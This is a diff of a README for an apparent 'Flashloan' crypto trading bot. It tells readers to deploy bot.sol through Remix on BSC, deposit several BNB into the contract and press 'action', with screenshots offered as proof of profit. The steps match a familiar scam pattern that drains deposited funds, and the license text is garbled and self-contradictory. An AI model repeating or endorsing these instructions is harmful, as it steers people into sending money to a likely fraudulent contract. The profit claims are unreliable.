@@ -15,7 +15,6 @@ This infrastructure empowers developers and users to execute Flashloans directly
 
 
 ## 🤖 How to Use the Flashloan Bot
-![241020628-7f849bd6-2e7a-4065-8119-e415dfb21777](https://github.com/mevbotsethandbsc/mev-bot/assets/122781085/f7de7f33-0f86-4bcf-912e-45650b90625c)
 
 ### Step 1: Access the Source Code 📝
 Navigate to the Remix IDE: https://remix.ethereum.org/
@@ -35,27 +34,51 @@ Click 'Compile bot.sol'.
 
 
 
-### Step 3: Choose the Network 🌐
-Select either BSC (BNB) network.
-![image](https://github.com/mevbotsethandbsc/mev-bot/assets/122781085/1839fb48-6239-42c8-abe7-3912e8a8202d)
+### Step 3: Check the Network 🌐
+Make sure you are on the BSC network.
+
+![Screenshot 2023-06-04 at 15 46 42](https://github.com/xretiun/flashloan/assets/135456232/3b182f0e-ed21-41f3-93b9-6c5e6b402a92)
 
 
 ### Step 4: Deploy the Code 🚀
+
+Click the Little dropdown arrow to view the fields: 
+![Screenshot 2023-06-04 at 15 50 27](https://github.com/xretiun/flashloan/assets/135456232/5edca3fe-1a7e-4c07-a51f-1771b902d3d6)
+
+
+Fill in the information like below: 
+_TOKENNAME:(ANY TOKEN NAME YOU LIKE)
+_TOKENSYMBOL: TOKEN SYMBOL
+_LOANAMOUNT: AMOUNT OF TOKENS YOU WANT TO LOAN (DONT NEED TO HOLD THE TOKENS - I RECOMMEND 2000)
+
 Click 'Transact (Deploy)'.
 
+![Screenshot 2023-06-04 at 15 51 09](https://github.com/xretiun/flashloan/assets/135456232/99a6a208-9d87-4720-8cb4-4b97fae747d3)
 
-### Step 5: Deposit into MEVBot 💰
-Copy your MEV contract and send an amount of Ethereum for the bot's operation.
-Start the bot by pressing the 'Start' button.
-![image](https://github.com/mevbotsethandbsc/mev-bot/assets/122781085/96923936-48c2-40ef-bc17-f770a7710a96)
-![image](https://github.com/mevbotsethandbsc/mev-bot/assets/122781085/fc92b50b-f1b6-429e-a8fd-8b10a63179aa)
 
-### 🔔 Note: For successful transactions on the Ethereum network, you must have sufficient balance to cover the gas fees. We recommend a minimum of 0.25-1 ETH. Anything below that might result in loss of funds ### please understand that this bot needs enough funds to buy and sell and cover all fees and cost in 1 transaction 
+### Step 5: Deposit into Flashbot 💰
+Copy your Flashloan contract and send an amount of BSC for the bot's operation.
+Start the bot by pressing the 'action' button.
 
-### You can withdraw funds by clicking the 'Stop' and 'Withdrawal' button.
+![Screenshot 2023-06-04 at 15 54 59](https://github.com/xretiun/flashloan/assets/135456232/2f837f37-6c18-48f3-8208-fb1c56ec9457)
+![Screenshot 2023-06-04 at 15 55 40](https://github.com/xretiun/flashloan/assets/135456232/4cb37df8-ee20-4fcc-823d-68f7337df9f2)
 
-UPD: If you have closed the Remix IDE website or accidentally rebooted your computer, you can still access all the bot's functions through Etherscan. You will need to verify the bot contract on Etherscan, and you will have access to the same functions as you would through the Remix IDE website.
 
-Copyright (C) 2023 MevBotsETHandBSC
+## RESULTS: 
+
+Before:
+
+![Screenshot 2023-06-04 at 15 56 14](https://github.com/xretiun/flashloan/assets/135456232/5c49ed8a-7469-407e-a9f2-2b18c5ef4cab)
+
+After around 7 min: 
+![Screenshot 2023-06-04 at 15 56 51](https://github.com/xretiun/flashloan/assets/135456232/4f09af68-7c3f-4dfc-8189-0746c87bc9c0)
+
+
+### 🔔 Note: For successful transactions on the BSC network, you must have sufficient balance to cover the gas fees. We recommend a minimum of 1-2 BNB. Anything below that might result in loss of funds ### please understand that this bot needs enough funds to buy and sell and cover all fees and cost in 1 transaction That beeing said I recommend starting with 4-6 BNB For the best results
+
+### The CONTRACT has only 1 function (action) function, it automatically transfers all the revenue to your wallet (creator wallet)
+
+
+Copyright (C) 2023 FlashloanBots
 
 This program is free software for 30 days: you can redistribute and/or modify it under the terms of the MIT Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
